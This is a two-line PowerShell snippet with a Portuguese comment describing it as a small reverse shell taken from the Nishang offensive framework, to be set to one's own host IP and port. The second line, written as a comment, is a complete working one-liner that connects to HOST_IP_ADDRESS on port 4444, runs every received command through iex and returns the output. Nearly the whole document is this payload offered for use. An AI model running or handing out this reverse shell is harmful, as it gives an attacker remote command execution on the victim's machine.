#Um shell reverso simples e pequeno da estrutura Nishang do samratashok. Altere o endereço IP do host e a porta de acordo com sua configuração, conforme descrito no arquivo README do script.
#$sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
